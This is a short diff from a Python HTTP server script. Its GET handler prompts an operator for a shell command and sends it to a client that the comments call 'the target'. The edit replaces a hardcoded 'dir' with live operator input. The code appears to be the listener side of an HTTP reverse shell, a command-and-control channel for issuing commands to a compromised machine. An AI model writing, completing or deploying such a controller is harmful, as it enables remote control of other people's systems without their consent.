@@ -11,8 +11,8 @@ class MyHandler(BaseHTTPRequestHandler): # MyHandler defines what we should do w
     def do_GET(s):
         #If we got a GET request, we will:- 
         print("pleae enter command")
-        # command = input() #take user input
-        command = "dir"
+        command = input() #take user input
+        # command = "dir"
         print(command)
         s.send_response(200) #return HTML status 200 (OK)
         s.send_header("Content-type", "text/html") # Inform the target that content type header is "text/html"
